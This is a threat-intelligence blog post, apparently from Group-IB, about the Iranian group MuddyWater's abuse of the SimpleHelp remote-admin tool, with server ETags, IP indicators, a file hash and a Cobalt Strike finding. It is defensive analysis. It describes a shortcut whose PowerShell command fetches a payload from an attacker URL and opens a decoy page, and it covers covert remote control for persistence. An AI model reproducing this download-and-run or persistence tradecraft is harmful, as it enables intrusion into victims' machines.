SimpleHarm: Tracking MuddyWater’s infrastructure
As a result of the ongoing military conflict, state-sponsored hackers have been more active, as we forecasted in the
report Hi-Tech Crime Trends 2022/2023. Most attackers have engaged in cyber espionage against neighboring
countries. One such group is MuddyWater, which Group-IB has written about before.
According to publicly available research, MuddyWater is assessed to be a subordinate element within Iran’s
Intelligence Ministry (MOIS). According to the US Congressional Research Service, the MOIS “conducts domestic
surveillance to identify regime opponents”. Recent MuddyWater attacks targeted insurance, manufacturing and
telecommunications companies in Israel and Egypt. As part of the attacks against Israeli organizations, the group
exploited Log4j 2 vulnerabilities, according to Microsoft.
In the last few years, the group has been using legitimate remote control tools such as ScreenConnect,
RemoteUtilities, and Syncro. By doing so, MuddyWater can connect to user devices at any moment and execute
arbitrary commands, as well as download and upload files. It is difficult to track the activity of these tools because
they are legitimate and not compromised, which is why they cannot be detected using traditional security tools. In the
fall of 2022, using the Group-IB Threat Intelligence system, we discovered that MuddyWater used another similar
tool, SimpleHelp. As we were conducting our analysis, our colleagues at ESET published a quarterly report in which
they also mentioned that the group was using this tool.
In this blog post, we describe how the group uses SimpleHelp as well as previously unknown infrastructure, which
we uncovered through our research. By continuously tracking tactics, techniques, and procedures used by threat
actors, Group-IB is able to proactively respond to malicious campaigns in the making and block new servers even
when they are only being set up for attacks.
The aim of this blog post is to help information security specialists investigate incidents, understand MuddyWater’s
network infrastructure in detail, and identify the group’s servers independently. This will help fine-tune security
systems to proactively detect new activity by this threat actor.

Key findings
2/22
MuddyWater uses SimpleHelp, a legitimate remote device control and management tool, to ensure persistence
on victim devices.
SimpleHelp is not compromised and is used as intended. The threat actors found a way to download the tool
from the official website and use it in their attacks.
According to our data, MuddyWater used SimpleHelp for the first time on June 30, 2022. At the time of writing,
the group has at least eight servers on which they have SimpleHelp installed.
This blog post describes MuddyWater’s previously unknown infrastructure and points to links with some of the
group’s publicly known IP addresses.
The group’s servers can be tracked by the same ETag hashes used:
2aa6-5c939a3a79153
2aa6-5b27e6e58988b
2aa6-5c939a773f7a2
SimpleHelp
In the fall of 2022, as part of a retrospective analysis of infrastructures used by threat actors, Group-IB’s Threat
Intelligence platform detected the IP address 51.254.25[.]36, which has been connected with APT MuddyWater since
at least February 2022. We later detected a file linked to this IP address; the file is called new aviation
communications.exe (SHA1: 53ce7a2850e27465f3aae3cc2fae1a3ec1b6a640).

The file “new aviation communications.exe” was uploaded to VirusTotal on June 30, 2022. It is a legitimate version of
SimpleHelp with a valid digital signature. The file was compiled on June 18, 2021 at 13:45:41 UTC.

After the analysis of two IP addresses, which Group-IB Threat Intelligence attributes to MuddyWater, we also
discovered deployed SimpleHelp servers: 51[.]255[.]19[.]179 and 51[.]255[.]19[.]178

SimpleHelp admin panel
SimpleHelp by SimpleHelp Ltd (UK) is an administration panel for system administrators and tech support teams. It
looks like this:
Figure 5: SImpleHelp interface
The SimpleHelp client installed on victim devices can constantly run as a system service, which makes it possible to
gain access to the user’s device at any point in time, even after a reboot.
6/22
Figure 6: Remote access to a victim’s computer in SimpleHelp
In addition to connecting remotely, SimpleHelp operators can execute various commands on the victim’s device,
including those that require administrator privileges:

SimpleHelp operators can also use the command “Connect in Terminal Mode” to take control of the target device
covertly.

In other words, the standard SimpleHelp functionality gives threat actors virtually unlimited possibilities to conduct
attacks.
What happens after SimpleHelp is installed?
At the time of writing, we do not know how exactly MuddyWater distributes the samples and what actions the group
takes after gaining access through SimpleHelp. We can assume that the group sends out phishing emails containing
links to file storage systems such as Onedrive or Onehub to download SimpleHelp installers. The group can also
establish persistence on victim devices by using Fast Reverse Proxy (FRP) or Ligolo in order to extract information of
interest and determine ways to move across the network.
MuddyWater’s network infrastructure
Group-IB devotes considerable time to tracking the network infrastructure used by state-sponsored and other threat
groups. As a result we are able to proactively protect our customers and collect data about attacks that are either
ongoing or in the making, even when we do not have access to malicious samples. The infrastructure that
MuddyWater currently uses can be divided into two categories:
Publicly known IP addresses used by the group
Non-disclosed IP addresses that are highly likely used by the group, according to Group-IB’s assessments
MuddyWater has been found to use its own unique set of components for deploying web servers on purchased virtual
private servers (VPSs). We detected the following ETag hashes used by the group:
2aa6-5c939a3a79153
2aa6-5b27e6e58988b
2aa6-5c939a773f7a2
MuddyWater is known to have used some of the servers connected with these ETag hashes. Other servers have links
to various malicious files or software used for attacks, including legitimate SimpleHelp installers.
Let’s do a graph analysis
Let’s start with the group’s publicly known IP addresses to illustrate the connection with the assistance of Group-IB’s
proprietary Graph Network Analysis Tool. According to a Microsoft report, MuddyWater used the following IP
addresses, where the abovementioned ETags were found:
164[.]132[.]237[.]64
91[.]121[.]240[.]104

On the server 164[.]132[.]237[.]65, we found the framework Cobalt Strike with the following configuration file:
Figure 12: Cobalt Strike configuration file
In November 2022, Group-IB’s Digital Forensics Lab and Threat Intelligence team responded to an incident in a
network belonging to an organization in the Middle East. The operation revealed that the abovementioned IP address
(164[.]132[.]237[.]65) had been used in the attack, while the tactics, techniques, and procedures (TTPs) we
discovered fully matched those used by MuddyWater. What is interesting about this config is that it has a unique
value in the field http-post.client and has no watermark field. This suggests that the threat actors use custom
samples of the well-known tool Cobalt Strike, which can be tracked.
91[.]121[.]240[.]104
This IP address is also mentioned in the Microsoft report and has the ETag 2aa6-5c939a3a79153:

The ETag 2aa6-5c939a3a79153 was located at the IP address 91[.]121[.]240[.]96 between October 25, 2021 and
September 23, 2022.
This address is connected with a PowerShell script that was uploaded to VirusTotal via the web interface from
Kazakhstan on July 19, 2022, i.e. when the ETag was on the server.

The command was used to download a payload from http://91[.]121[.]240[.]108:443/HBIy and save it to the file
C:\programdata\temp.vbs while the shortcut was executed. As a distraction, the page hxxps://mohap[.]gov[.]ae is
opened in Microsoft Edge with a dialog box informing that the file is corrupted. Unfortunately, at the time of the
analysis the file HBIy was unavailable, which is why its contents could not be examined.
It is worth noting the username that was left when the shortcut was created: C:\Users\Pink
Panter\Documents\PDF.ico. This suggests that the user who created the file has the username Pink Panter.

Conclusion
We believe it is important to share relevant hunting techniques  and we encourage cybersecurity researchers to
publish their latest findings more often. Information security specialists can use the ETag hashes mentioned in this
article and search for malicious servers using search engines such as Censys or Shodan. The table with network
indicators lists the IP addresses of some servers where SimpleHelp is installed and which, according to Group-IB
Threat Intelligence, belong to MuddyWater.
At the moment, we do not know for sure what vector MuddyWater uses for distributing SimpleHelp installers. It is
likely, however, that the threat actors use phishing emails with links to cloud storage spaces such as OneDrive,
Onehub, and Dropbox.
Recommendations
1. Use network indicators provided in this blog post to track MuddyWater’s activity and proactively protect
against the group’s attacks. By using search engines such as Shodan, you can search for malicious servers
used by the threat actors and always be ready to proactively block such hosts. In addition, Shodan can be used
to search for any new infrastructure used by the group.
2. Use corporate email security tools to effectively prevent various threat groups from using corporate email as
an attack vector. Thanks to unique threat intelligence data and patented technologies, Group-IB’s solution
called Business Email Protection detects and blocks phishing, malicious attachments, and other BEC attacks
with unprecedented precision, even if the threat actors use detection evasion techniques. Group-IB Business
Email Protection also analyzes and attributes email-borne threats to proactively protect against such attacks
and strengthen the organization’s overall security posture.
3. For advanced cybersecurity teams, we recommend using Group-IB’s Threat Intelligence system, which, as
we showed in this blog post, helped us detect MuddyWater’s use of SimpleHelp and expose its previously
unknown infrastructure. Thanks to unique data sources, our Threat Intelligence system can be used to detect
phishing and other relevant threats as early as during their preparation stage. The built-in graph analysis tool
21/22
enriched by data from the largest threat-actor database reveals links between attackers, their infrastructures,
and their tools. Enriching cybersecurity with threat intelligence helps significantly strengthen an organization’s
ability to counter attacks, including ones carried out by state-sponsored groups.
